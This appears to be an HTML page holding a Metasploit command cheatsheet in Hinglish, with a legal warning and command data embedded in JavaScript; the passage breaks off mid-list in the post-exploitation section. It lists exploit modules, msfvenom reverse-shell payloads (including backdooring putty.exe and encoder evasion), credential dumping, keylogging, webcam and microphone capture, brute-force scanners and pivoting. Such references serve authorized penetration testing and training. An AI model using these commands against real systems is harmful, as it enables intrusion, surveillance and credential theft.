@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Cheatsheet - Created by KARCHO TERANG</title>
+<meta name="author" content="KARCHO TERANG">
+<meta name="description" content="Metasploit Complete Cheatsheet - 300+ Commands by KARCHO TERANG">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+  body { background:#0d1117; color:#c9d1d9; line-height:1.6; }
+  
+  /* ===== HEADER ===== */
+  header {
+    background:linear-gradient(90deg,#161b22,#0d1117);
+    padding:15px 20px; border-bottom:2px solid #00ff88;
+    display:flex; justify-content:space-between; align-items:center;
+    position:sticky; top:0; z-index:100; flex-wrap:wrap; gap:10px;
+  }
+  header h1 { color:#00ff88; font-size:1.3rem; }
+  header .back-btn {
+    background:#21262d; color:#c9d1d9; border:1px solid #30363d;
+    padding:6px 14px; border-radius:6px; cursor:pointer;
+    text-decoration:none; font-size:0.85rem;
+  }
+  header .back-btn:hover { background:#00ff88; color:#000; }
+  header .badge { color:#ff5555; font-size:0.75rem; border:1px solid #ff5555; padding:4px 10px; border-radius:15px; }
+  
+  /* ===== CREATOR BANNER ===== */
+  .creator-banner {
+    background:linear-gradient(135deg, #00ff88 0%, #00cc6a 50%, #009950 100%);
+    padding:20px; text-align:center;
+    border-bottom:3px solid #00ff88;
+    box-shadow:0 4px 20px rgba(0,255,136,0.3);
+  }
+  .creator-banner .creator-label {
+    color:#003d1f; font-size:0.8rem; letter-spacing:3px;
+    text-transform:uppercase; font-weight:bold; opacity:0.8;
+  }
+  .creator-banner .creator-name {
+    color:#000; font-size:1.8rem; font-weight:900;
+    letter-spacing:2px; text-shadow:0 2px 4px rgba(0,0,0,0.15);
+    margin-top:4px;
+  }
+  .creator-banner .creator-role {
+    color:#003d1f; font-size:0.85rem; margin-top:4px;
+    font-weight:600; opacity:0.9;
+  }
+  
+  /* ===== SEARCH ===== */
+  .search-container { max-width:1200px; margin:20px auto 0; padding:0 20px; }
+  .search-box {
+    width:100%; padding:12px 20px; background:#21262d; 
+    border:1px solid #30363d; border-radius:8px; 
+    color:#c9d1d9; font-size:1rem;
+  }
+  .search-box:focus { outline:none; border-color:#00ff88; }
+  
+  /* ===== NAV ===== */
+  nav {
+    background:#161b22; padding:12px 20px; display:flex; gap:8px;
+    overflow-x:auto; border-bottom:1px solid #30363d;
+    position:sticky; top:68px; z-index:99;
+  }
+  nav button {
+    background:#21262d; color:#c9d1d9; border:1px solid #30363d;
+    padding:8px 14px; border-radius:6px; cursor:pointer; 
+    white-space:nowrap; font-size:0.82rem; transition:0.2s;
+  }
+  nav button:hover { background:#00ff88; color:#000; border-color:#00ff88; }
+  nav button.active { background:#00ff88; color:#000; }
+  
+  /* ===== CONTAINER ===== */
+  .container { max-width:1200px; margin:20px auto; padding:0 20px; }
+  
+  .warning {
+    background:#3d1e1e; border-left:4px solid #ff5555;
+    padding:15px; margin-bottom:20px; border-radius:5px;
+    font-size:0.9rem;
+  }
+  .warning strong { color:#ff5555; }
+  
+  /* ===== STATS ===== */
+  .stats {
+    display:flex; gap:15px; margin:20px 0; flex-wrap:wrap;
+    padding:15px; background:#161b22; border-radius:8px;
+    border:1px solid #30363d;
+  }
+  .stat { text-align:center; flex:1; min-width:100px; }
+  .stat .num { color:#00ff88; font-size:1.5rem; font-weight:bold; }
+  .stat .label { color:#8b949e; font-size:0.75rem; }
+  
+  /* ===== SECTIONS ===== */
+  .section {
+    background:#161b22; border:1px solid #30363d; border-radius:10px;
+    margin-bottom:20px; overflow:hidden;
+  }
+  .section-header {
+    background:#1c2128; padding:15px 20px; cursor:pointer;
+    display:flex; justify-content:space-between; align-items:center;
+    border-bottom:1px solid #30363d;
+    transition:0.2s;
+  }
+  .section-header:hover { background:#21262d; }
+  .section-header h2 { color:#00ff88; font-size:1.1rem; }
+  .section-header .count {
+    background:#00ff88; color:#000; padding:2px 10px;
+    border-radius:12px; font-size:0.75rem; font-weight:bold;
+    margin-left:10px;
+  }
+  .section-header .arrow {
+    color:#8b949e; transition:0.3s; font-size:1.2rem;
+  }
+  .section.open .arrow { transform:rotate(180deg); }
+  
+  .section-body { display:none; padding:15px 20px; }
+  .section.open .section-body { display:block; }
+  
+  /* ===== COMMAND ITEMS ===== */
+  .cmd-item {
+    margin-bottom:12px; padding:10px 12px;
+    background:#0d1117; border-radius:6px;
+    border-left:3px solid #00ff88;
+  }
+  .cmd-desc {
+    color:#8b949e; font-size:0.85rem; margin-bottom:6px;
+  }
+  .cmd-code {
+    font-family:'Courier New',monospace; color:#79c0ff;
+    font-size:0.82rem; padding:6px 8px; background:#161b22;
+    border-radius:4px; cursor:pointer; position:relative;
+    overflow-x:auto; white-space:pre; margin-top:4px;
+    transition:0.2s;
+  }
+  .cmd-code:hover { background:#1f242c; color:#00ff88; }
+  .cmd-code::after {
+    content:'📋'; position:absolute; right:10px; 
+    opacity:0; transition:0.2s;
+  }
+  .cmd-code:hover::after { opacity:0.7; }
+  
+  /* ===== TOAST ===== */
+  .toast {
+    position:fixed; bottom:30px; left:50%; 
+    transform:translateX(-50%) translateY(100px);
+    background:#00ff88; color:#000; padding:12px 24px; 
+    border-radius:8px; font-weight:bold; opacity:0; 
+    transition:0.3s; z-index:1000;
+  }
+  .toast.show { transform:translateX(-50%) translateY(0); opacity:1; }
+  
+  .no-result { text-align:center; padding:40px; color:#8b949e; }
+  
+  /* ===== FOOTER ===== */
+  footer {
+    text-align:center; padding:40px 20px 30px; color:#8b949e;
+    border-top:2px solid #30363d; margin-top:40px;
+    background:linear-gradient(180deg, #0d1117 0%, #161b22 100%);
+  }
+  footer .footer-credit {
+    display:inline-block;
+    background:linear-gradient(135deg, #00ff88 0%, #00cc6a 100%);
+    color:#000; padding:12px 30px; border-radius:50px;
+    font-weight:900; font-size:1.1rem; letter-spacing:2px;
+    margin:15px 0; box-shadow:0 4px 20px rgba(0,255,136,0.4);
+  }
+  footer .footer-tagline {
+    color:#00ff88; font-size:0.9rem; margin-top:10px;
+    font-weight:600;
+  }
+  footer .footer-sub {
+    color:#8b949e; font-size:0.75rem; margin-top:8px;
+  }
+  footer .social-links {
+    display:flex; justify-content:center; gap:15px;
+    margin:15px 0; flex-wrap:wrap;
+  }
+  footer .social-links a {
+    color:#00ff88; text-decoration:none; font-size:0.85rem;
+    padding:6px 14px; border:1px solid #00ff88;
+    border-radius:20px; transition:0.2s;
+  }
+  footer .social-links a:hover {
+    background:#00ff88; color:#000;
+  }
+  
+  @media (max-width:600px) {
+    nav { top:auto; position:static; }
+    header { position:static; }
+    .creator-banner .creator-name { font-size:1.3rem; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== HEADER ===== -->
+<header>
+  <h1>💥 Metasploit Cheatsheet</h1>
+  <div style="display:flex; gap:10px; align-items:center;">
+    <a href="index.html" class="back-btn">← Back to Hub</a>
+    <span class="badge">⚠️ Educational Only</span>
+  </div>
+</header>
+
+<!-- ===== CREATOR BANNER ===== -->
+<div class="creator-banner">
+  <div class="creator-label">✦ Created By ✦</div>
+  <div class="creator-name">KARCHO TERANG</div>
+  <div class="creator-role">🛡️ Ethical Hacker | Cybersecurity Researcher</div>
+</div>
+
+<!-- ===== SEARCH ===== -->
+<div class="search-container">
+  <input type="text" class="search-box" id="search" 
+         placeholder="🔍 Command ya keyword search karo... (jaise: meterpreter, hashdump, msfvenom)" 
+         onkeyup="searchCommands()">
+</div>
+
+<!-- ===== NAVIGATION ===== -->
+<nav id="nav">
+  <button class="active" onclick="filter('all', this)">📚 All Sections</button>
+  <button onclick="filter('basics', this)">⚙️ Basics</button>
+  <button onclick="filter('search', this)">🔍 Search & Select</button>
+  <button onclick="filter('options', this)">📝 Set Options</button>
+  <button onclick="filter('exploit', this)">💥 Run Exploits</button>
+  <button onclick="filter('meterpreter', this)">🎭 Meterpreter</button>
+  <button onclick="filter('privesc', this)">⬆️ Privilege Esc</button>
+  <button onclick="filter('pivot', this)">🔄 Pivoting</button>
+  <button onclick="filter('msfvenom', this)">🔨 msfvenom</button>
+  <button onclick="filter('handler', this)">🎧 Handlers</button>
+  <button onclick="filter('exploits', this)">💣 Popular Exploits</button>
+  <button onclick="filter('aux', this)">📡 Auxiliary</button>
+  <button onclick="filter('post', this)">🎯 Post-Exploit</button>
+  <button onclick="filter('scripts', this)">📜 Scripts</button>
+</nav>
+
+<div class="container">
+
+  <div class="warning">
+    <strong>⚠️ LEGAL WARNING:</strong> Yeh sirf <b>educational purpose</b> ke liye hai. 
+    Metasploit ko bina authorization use karna <b>IT Act 2000 (Section 43, 66)</b> ke tahat 
+    punishable crime hai. Practice ke liye <b>TryHackMe, HackTheBox, VulnHub</b> use karein.
+  </div>
+
+  <div class="stats">
+    <div class="stat"><div class="num" id="totalCmds">0</div><div class="label">Commands</div></div>
+    <div class="stat"><div class="num" id="totalSections">0</div><div class="label">Sections</div></div>
+    <div class="stat"><div class="num">300+</div><div class="label">Total Reference</div></div>
+    <div class="stat"><div class="num" style="color:#ffa657;">KARCHO</div><div class="label">Created By</div></div>
+  </div>
+
+  <div id="sectionsContainer"></div>
+
+</div>
+
+<!-- ===== FOOTER ===== -->
+<footer>
+  <div style="font-size:0.9rem; color:#8b949e;">Metasploit Complete Cheatsheet</div>
+  
+  <div class="footer-credit">👨‍💻 KARCHO TERANG 👨‍💻</div>
+  
+  <div class="footer-tagline">🛡️ Learn Ethical Hacking, Stay Legal 🛡️</div>
+  
+  <div class="social-links">
+    <a href="#" onclick="return false;">📧 Contact</a>
+    <a href="#" onclick="return false;">💼 Portfolio</a>
+    <a href="#" onclick="return false;">🐙 GitHub</a>
+    <a href="#" onclick="return false;">📺 YouTube</a>
+  </div>
+  
+  <div class="footer-sub">
+    © 2025 <strong style="color:#00ff88;">KARCHO TERANG</strong> — All Rights Reserved<br>
+    Educational Purposes Only | Commands click karke copy karein 📋
+  </div>
+</footer>
+
+<div class="toast" id="toast">✅ Copied!</div>
+
+<script>
+// ==================== METASPLOIT DATABASE ====================
+// Created by KARCHO TERANG
+const AUTHOR = "KARCHO TERANG";
+
+const sections = [
+  {
+    id: 'basics', title: '⚙️ Console Basics', icon: '⚙️',
+    items: [
+      { desc: 'Metasploit console start karo', cmd: 'msfconsole' },
+      { desc: 'Quiet mode mein start karo (banner ke bina)', cmd: 'msfconsole -q' },
+      { desc: 'Resource script ke saath start karo', cmd: 'msfconsole -r resource.rc' },
+      { desc: 'Database initialize karo', cmd: 'msfdb init' },
+      { desc: 'Database start karo', cmd: 'msfdb start' },
+      { desc: 'Database stop karo', cmd: 'msfdb stop' },
+      { desc: 'Database status check karo', cmd: 'msfdb status' },
+      { desc: 'Console mein DB status', cmd: 'db_status' },
+      { desc: 'Workspace list karo', cmd: 'workspace' },
+      { desc: 'Naya workspace banao', cmd: 'workspace add pentest1' },
+      { desc: 'Workspace switch karo', cmd: 'workspace pentest1' },
+      { desc: 'Workspace delete karo', cmd: 'workspace -d pentest1' },
+      { desc: 'Console se exit karo', cmd: 'exit' },
+      { desc: 'Screen clear karo', cmd: 'clear' },
+      { desc: 'Command history dekho', cmd: 'history' },
+      { desc: 'Help dekho', cmd: 'help' },
+      { desc: 'Specific command ki help', cmd: 'help use' },
+      { desc: 'Logging start karo', cmd: 'spool /tmp/msf.log' },
+      { desc: 'Logging stop karo', cmd: 'spool off' }
+    ]
+  },
+  {
+    id: 'search', title: '🔍 Search & Module Selection', icon: '🔍',
+    items: [
+      { desc: 'CVE se search karo', cmd: 'search ms17-010' },
+      { desc: 'Keyword se search', cmd: 'search eternalblue' },
+      { desc: 'Type, platform, service se search', cmd: 'search type:exploit platform:windows smb' },
+      { desc: 'Log4Shell search karo', cmd: 'search cve:2021-44228' },
+      { desc: 'Name se search', cmd: 'search name:apache' },
+      { desc: 'Best rank modules', cmd: 'search rank:excellent' },
+      { desc: 'Author se search', cmd: 'search author:hdm' },
+      { desc: 'Description mein search', cmd: 'search -S "remote code"' },
+      { desc: 'Exploit use karo', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
+      { desc: 'Auxiliary scanner use karo', cmd: 'use auxiliary/scanner/smb/smb_version' },
+      { desc: 'Post module use karo', cmd: 'use post/windows/gather/hashdump' },
+      { desc: 'Payload use karo', cmd: 'use payload/windows/meterpreter/reverse_tcp' },
+      { desc: 'Module ki poori info dekho', cmd: 'info' },
+      { desc: 'Required options dikhao', cmd: 'show options' },
+      { desc: 'Advanced options dikhao', cmd: 'show advanced' },
+      { desc: 'Missing options dikhao', cmd: 'show missing' },
+      { desc: 'Compatible payloads dikhao', cmd: 'show payloads' },
+      { desc: 'Targets dikhao', cmd: 'show targets' },
+      { desc: 'Encoders dikhao', cmd: 'show encoders' },
+      { desc: 'Ek step peeche jao', cmd: 'back' }
+    ]
+  },
+  {
+    id: 'options', title: '📝 Setting Options', icon: '📝',
+    items: [
+      { desc: 'Target IP set karo', cmd: 'set RHOSTS 192.168.1.1' },
+      { desc: 'Subnet set karo', cmd: 'set RHOSTS 192.168.1.0/24' },
+      { desc: 'File se targets load karo', cmd: 'set RHOSTS file:/tmp/targets.txt' },
+      { desc: 'Target port set karo', cmd: 'set RPORT 445' },
+      { desc: 'Local IP (attacker) set karo', cmd: 'set LHOST 192.168.1.100' },
+      { desc: 'Local port set karo', cmd: 'set LPORT 4444' },
+      { desc: 'Payload set karo', cmd: 'set PAYLOAD windows/meterpreter/reverse_tcp' },
+      { desc: 'Target index set karo', cmd: 'set TARGET 1' },
+      { desc: 'Threads set karo', cmd: 'set THREADS 10' },
+      { desc: 'Verbose output enable karo', cmd: 'set VERBOSE true' },
+      { desc: 'Option clear karo', cmd: 'unset RHOSTS' },
+      { desc: 'Sab options clear karo', cmd: 'unset all' },
+      { desc: 'Global LHOST set karo (sab modules ke liye)', cmd: 'setg LHOST 192.168.1.100' },
+      { desc: 'Global LPORT set karo', cmd: 'setg LPORT 4444' },
+      { desc: 'Global unset karo', cmd: 'unsetg LHOST' },
+      { desc: 'Current settings save karo', cmd: 'save' }
+    ]
+  },
+  {
+    id: 'exploit', title: '💥 Running Exploits & Sessions', icon: '💥',
+    items: [
+      { desc: 'Exploit run karo', cmd: 'run' },
+      { desc: 'Alternative run', cmd: 'exploit' },
+      { desc: 'Background job mein chalao', cmd: 'exploit -j' },
+      { desc: 'Session ke baad interactive na ho', cmd: 'exploit -z' },
+      { desc: 'Combine flags', cmd: 'run -j -z' },
+      { desc: 'Running jobs list karo', cmd: 'jobs' },
+      { desc: 'Detailed jobs list', cmd: 'jobs -l' },
+      { desc: 'Specific job kill karo', cmd: 'jobs -k 1' },
+      { desc: 'Sab jobs kill karo', cmd: 'jobs -K' },
+      { desc: 'All sessions list karo', cmd: 'sessions' },
+      { desc: 'Detailed sessions list', cmd: 'sessions -l' },
+      { desc: 'Session 1 mein interact karo', cmd: 'sessions -i 1' },
+      { desc: 'Session kill karo', cmd: 'sessions -k 1' },
+      { desc: 'Sab sessions kill karo', cmd: 'sessions -K' },
+      { desc: 'Shell ko meterpreter mein upgrade karo', cmd: 'sessions -u 1' },
+      { desc: 'Session ko naam do', cmd: 'sessions -n mysession -i 1' }
+    ]
+  },
+  {
+    id: 'meterpreter', title: '🎭 Meterpreter Commands', icon: '🎭',
+    items: [
+      { desc: 'System info (OS, hostname, arch)', cmd: 'sysinfo' },
+      { desc: 'Current user ka UID', cmd: 'getuid' },
+      { desc: 'Current process ID', cmd: 'getpid' },
+      { desc: 'Available privileges', cmd: 'getprivs' },
+      { desc: 'Privilege escalation try karo', cmd: 'getsystem' },
+      { desc: 'Environment variables dekho', cmd: 'getenv' },
+      { desc: 'Current directory', cmd: 'getwd' },
+      { desc: 'Directory list karo', cmd: 'ls' },
+      { desc: 'Directory change karo', cmd: 'cd /root' },
+      { desc: 'File read karo', cmd: 'cat /etc/passwd' },
+      { desc: 'Process list dekho', cmd: 'ps' },
+      { desc: 'Process search karo', cmd: 'pgrep explorer' },
+      { desc: 'Process mein migrate karo', cmd: 'migrate 1234' },
+      { desc: 'Name se migrate karo', cmd: 'migrate -N explorer.exe' },
+      { desc: 'Process kill karo', cmd: 'kill 1234' },
+      { desc: 'Interactive cmd execute karo', cmd: 'execute -f cmd.exe -i -H' },
+      { desc: 'Hidden execute karo', cmd: 'execute -f calc.exe -H' },
+      { desc: 'File download karo', cmd: 'download /etc/passwd' },
+      { desc: 'Recursive download', cmd: 'download -r /var/www' },
+      { desc: 'File upload karo', cmd: 'upload /tmp/shell.exe C:\\\\Windows\\\\Temp\\\\' },
+      { desc: 'File edit karo', cmd: 'edit /etc/hosts' },
+      { desc: 'File delete karo', cmd: 'rm /tmp/file.txt' },
+      { desc: 'Directory banao', cmd: 'mkdir /tmp/newdir' },
+      { desc: 'File search karo', cmd: 'search -f *.txt' },
+      { desc: 'Network interfaces dekho', cmd: 'ipconfig' },
+      { desc: 'Routing table dekho', cmd: 'route' },
+      { desc: 'ARP cache dekho', cmd: 'arp' },
+      { desc: 'Network connections dekho', cmd: 'netstat' },
+      { desc: 'Port forward add karo', cmd: 'portfwd add -l 8080 -p 80 -r 192.168.1.10' },
+      { desc: 'Port forwards list karo', cmd: 'portfwd list' },
+      { desc: 'Port forward delete karo', cmd: 'portfwd delete -l 8080' },
+      { desc: 'Sab forwards flush karo', cmd: 'portfwd flush' },
+      { desc: 'SAM database dump karo', cmd: 'hashdump' },
+      { desc: 'Smart hashdump', cmd: 'smart_hashdump' },
+      { desc: 'Smart hashdump module', cmd: 'run post/windows/gather/smart_hashdump' },
+      { desc: 'Cached domain creds', cmd: 'run post/windows/gather/cachedump' },
+      { desc: 'LSA secrets dump', cmd: 'run post/windows/gather/lsa_secrets' },
+      { desc: 'Credential collector', cmd: 'run post/windows/gather/credentials/credential_collector' },
+      { desc: 'Firefox passwords gather', cmd: 'run post/multi/gather/firefox_creds' },
+      { desc: 'Screenshot lo', cmd: 'screenshot' },
+      { desc: 'Screenshot save karo', cmd: 'screenshot -p /tmp/screen.jpg' },
+      { desc: 'Webcam list karo', cmd: 'webcam_list' },
+      { desc: 'Webcam se photo lo', cmd: 'webcam_snap' },
+      { desc: 'Webcam stream karo', cmd: 'webcam_stream' },
+      { desc: 'Mic record karo', cmd: 'record_mic -d 30' },
+      { desc: 'Keylogger start karo', cmd: 'keyscan_start' },
+      { desc: 'Captured keys dump karo', cmd: 'keyscan_dump' },
+      { desc: 'Keylogger stop karo', cmd: 'keyscan_stop' },
+      { desc: 'Live screen share', cmd: 'screenshare' }
+    ]
+  },
+  {
+    id: 'privesc', title: '⬆️ Privilege Escalation', icon: '⬆️',
+    items: [
+      { desc: 'Auto escalate try karo', cmd: 'getsystem' },
+      { desc: 'Technique 1 use karo', cmd: 'getsystem -t 1' },
+      { desc: 'Local exploit suggest karo', cmd: 'run post/multi/recon/local_exploit_suggester' },
+      { desc: 'UAC bypass', cmd: 'run post/windows/escalate/bypassuac' },
+      { desc: 'UAC bypass module', cmd: 'use exploit/windows/local/bypassuac' },
+      { desc: 'UAC bypass injection', cmd: 'use exploit/windows/local/bypassuac_injection' },
+      { desc: 'UAC bypass eventvwr', cmd: 'use exploit/windows/local/bypassuac_eventvwr' },
+      { desc: 'MS10-015 Kitrap0d', cmd: 'use exploit/windows/local/ms10_015_kitrap0d' },
+      { desc: 'MS14-058 Track Popup', cmd: 'use exploit/windows/local/ms14_058_track_popup_menu' },
+      { desc: 'MS15-051 Client Copy Image', cmd: 'use exploit/windows/local/ms15_051_client_copy_image' },
+      { desc: 'MS16-075 Reflection', cmd: 'use exploit/windows/local/ms16_075_reflection' },
+      { desc: 'MS16-032 Secondary Logon', cmd: 'use exploit/windows/local/ms16_032_secondary_logon_handle_privesc' },
+      { desc: 'Linux Sudo Baron', cmd: 'use exploit/linux/local/sudo_baron' },
+      { desc: 'Load kiwi (Mimikatz)', cmd: 'load kiwi' },
+      { desc: 'All credentials dump karo', cmd: 'creds_all' },
+      { desc: 'MSV credentials dump', cmd: 'creds_msv' },
+      { desc: 'Kerberos tickets list', cmd: 'kerberos_ticket_list' },
+      { desc: 'Golden ticket banao', cmd: 'golden_ticket_create -u Administrator -d test.local -s S-1-5-21-xxx -k HASH -t /tmp/ticket.kirbi' },
+      { desc: 'SAM dump (kiwi se)', cmd: 'lsa_dump_sam' },
+      { desc: 'Secrets dump (kiwi se)', cmd: 'lsa_dump_secrets' }
+    ]
+  },
+  {
+    id: 'pivot', title: '🔄 Pivoting & Routing', icon: '🔄',
+    items: [
+      { desc: 'Internal network ke liye route add karo', cmd: 'route add 192.168.2.0 255.255.255.0 1' },
+      { desc: 'Routes dekho', cmd: 'route print' },
+      { desc: 'Sab routes flush karo', cmd: 'route flush' },
+      { desc: 'Auto route setup karo', cmd: 'run post/multi/manage/autoroute' },
+      { desc: 'Autoroute module use karo', cmd: 'use post/multi/manage/autoroute' },
+      { desc: 'Subnet specify karo', cmd: 'set SUBNET 192.168.2.0' },
+      { desc: 'SOCKS proxy server start karo', cmd: 'use auxiliary/server/socks_proxy' },
+      { desc: 'SOCKS port set karo', cmd: 'set SRVPORT 1080' },
+      { desc: 'SOCKS version 5', cmd: 'set VERSION 5' },
+      { desc: 'Proxy start karo background mein', cmd: 'run -j' },
+      { desc: 'RDP port forward karo', cmd: 'portfwd add -l 3389 -p 3389 -r 192.168.2.10' },
+      { desc: 'External interface par forward karo', cmd: 'portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 192.168.2.10' }
+    ]
+  },
+  {
+    id: 'msfvenom', title: '🔨 msfvenom Payload Generation', icon: '🔨',
+    items: [
+      { desc: 'Windows EXE payload', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe' },
+      { desc: 'Encoded Windows EXE (10 iterations)', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe' },
+      { desc: 'Windows x64 payload', cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell64.exe' },
+      { desc: 'Windows reverse HTTPS', cmd: 'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o shell.exe' },
+      { desc: 'Windows DLL', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o evil.dll' },
+      { desc: 'ASP payload', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp' },
+      { desc: 'ASPX payload', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f aspx -o shell.aspx' },
+      { desc: 'JSP payload', cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp' },
+      { desc: 'PHP payload', cmd: 'msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php' },
+      { desc: 'Linux ELF payload', cmd: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf' },
+      { desc: 'Linux x64 payload', cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell64.elf' },
+      { desc: 'macOS payload', cmd: 'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho' },
+      { desc: 'Android APK payload', cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk' },
+      { desc: 'iOS payload', cmd: 'msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.ipa' },
+      { desc: 'Python payload', cmd: 'msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py' },
+      { desc: 'Bash reverse shell', cmd: 'msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.sh' },
+      { desc: '20 iterations encoding', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f exe -o shell.exe' },
+      { desc: 'Existing EXE mein inject karo', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoor.exe' },
+      { desc: 'All formats list', cmd: 'msfvenom --list formats' },
+      { desc: 'All encoders list', cmd: 'msfvenom --list encoders' },
+      { desc: 'All payloads list', cmd: 'msfvenom --list payloads' },
+      { desc: 'All platforms list', cmd: 'msfvenom --list platforms' }
+    ]
+  },
+  {
+    id: 'handler', title: '🎧 Multi/Handler Setup', icon: '🎧',
+    items: [
+      { desc: 'Basic handler setup', cmd: 'use exploit/multi/handler' },
+      { desc: 'Payload set karo', cmd: 'set PAYLOAD windows/meterpreter/reverse_tcp' },
+      { desc: 'LHOST set karo', cmd: 'set LHOST 192.168.1.100' },
+      { desc: 'LPORT set karo', cmd: 'set LPORT 4444' },
+      { desc: 'Multiple sessions allow karo', cmd: 'set ExitOnSession false' },
+      { desc: 'Background job mein chalao', cmd: 'exploit -j' },
+      { desc: 'HTTPS handler setup', cmd: 'set PAYLOAD windows/meterpreter/reverse_https' },
+      { desc: 'SSL cert set karo', cmd: 'set HandlerSSLCert /path/cert.pem' },
+      { desc: 'SSL cert verify disable', cmd: 'set StagerVerifySSLCert false' },
+      { desc: 'Multi-handler for any IP', cmd: 'set LHOST 0.0.0.0' }
+    ]
+  },
+  {
+    id: 'exploits', title: '💣 Popular Exploits', icon: '💣',
+    items: [
+      { desc: 'MS17-010 EternalBlue (Windows SMB)', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
+      { desc: 'MS08-067 (Windows Server)', cmd: 'use exploit/windows/smb/ms08_067_netapi' },
+      { desc: 'Log4Shell (CVE-2021-44228)', cmd: 'use exploit/multi/http/log4shell_header_injection' },
+      { desc: 'Apache Struts 2', cmd: 'use exploit/multi/http/struts2_content_type_ognl' },
+      { desc: 'vsftpd 2.3.4 Backdoor', cmd: 'use exploit/unix/ftp/vsftpd_234_backdoor' },
+      { desc: 'Samba usermap_script', cmd: 'use exploit/multi/samba/usermap_script' },
+      { desc: 'Shellshock (Apache mod_cgi)', cmd: 'use exploit/multi/http/apache_mod_cgi_bash_env_exec' },
+      { desc: 'Tomcat Manager upload', cmd: 'use exploit/multi/http/tomcat_mgr_upload' },
+      { desc: 'Jenkins Script Console', cmd: 'use exploit/multi/http/jenkins_script_console' },
+      { desc: 'Drupal Drupalgeddon2', cmd: 'use exploit/unix/webapp/drupal_drupalgeddon2' },
+      { desc: 'WebLogic deserialize', cmd: 'use exploit/multi/misc/weblogic_deserialize_asyncresponseservice' },
+      { desc: 'EternalBlue RHOST set karo', cmd: 'set RHOSTS 192.168.1.1' },
+      { desc: 'Payload set karo (x64)', cmd: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' },
+      { desc: 'Attacker IP set karo', cmd: 'set LHOST 192.168.1.100' },
+      { desc: 'Exploit run karo', cmd: 'run' }
+    ]
+  },
+  {
+    id: 'aux', title: '📡 Auxiliary Scanners', icon: '📡',
+    items: [
+      { desc: 'TCP port scan', cmd: 'use auxiliary/scanner/portscan/tcp' },
+      { desc: 'Ports range set karo', cmd: 'set PORTS 1-1000' },
+      { desc: 'Threads set karo', cmd: 'set THREADS 50' },
+      { desc: 'SMB version scan', cmd: 'use auxiliary/scanner/smb/smb_version' },
+      { desc: 'SSH version scan', cmd: 'use auxiliary/scanner/ssh/ssh_version' },
+      { desc: 'FTP version scan', cmd: 'use auxiliary/scanner/ftp/ftp_version' },
+      { desc: 'HTTP version scan', cmd: 'use auxiliary/scanner/http/http_version' },
+      { desc: 'MySQL version scan', cmd: 'use auxiliary/scanner/mysql/mysql_version' },
+      { desc: 'RDP scan', cmd: 'use auxiliary/scanner/rdp/rdp_scanner' },
+      { desc: 'VNC no auth scan', cmd: 'use auxiliary/scanner/vnc/vnc_none_auth' },
+      { desc: 'SMB login brute-force', cmd: 'use auxiliary/scanner/smb/smb_login' },
+      { desc: 'SMB user set karo', cmd: 'set SMBUser administrator' },
+      { desc: 'Password file set karo', cmd: 'set PASS_FILE /usr/share/wordlists/rockyou.txt' },
+      { desc: 'SSH login brute-force', cmd: 'use auxiliary/scanner/ssh/ssh_login' },
+      { desc: 'FTP login brute-force', cmd: 'use auxiliary/scanner/ftp/ftp_login' },
+      { desc: 'SMB shares enum', cmd: 'use auxiliary/scanner/smb/smb_enumshares' },
+      { desc: 'SMB users enum', cmd: 'use auxiliary/scanner/smb/smb_enumusers' },
+      { desc: 'db_nmap scan', cmd: 'db_nmap -sV -sC 192.168.1.0/24' },
+      { desc: 'Discovered hosts dekho', cmd: 'hosts' },
+      { desc: 'Discovered services dekho', cmd: 'services' }
+    ]
+  },
+  {
+    id: 'post', title: '🎯 Post-Exploitation Modules', icon: '🎯',
+    items: [
+      { desc: 'Windows hashdump', cmd: 'run post/windows/gather/hashdump' },
+      { desc: 'Smart hashdump', cmd: 'run post/windows/gather/smart_hashdump' },
+      { desc: 'Logged on users enum', cmd: 'run post/windows/gather/enum_logged_on_users' },
+      { desc: 'Applications enum', cmd: 'run post/windows/gather/enum_applications' },
+      { desc: 'Shares enum', cmd: 'run post/windows/gather/enum_shares' },
+      { desc: 'Domain enum', cmd: 'run post/windows/gather/enum_domain' },
+      { desc: 'Check VM', cmd: 'run post/windows/gather/checkvm' },
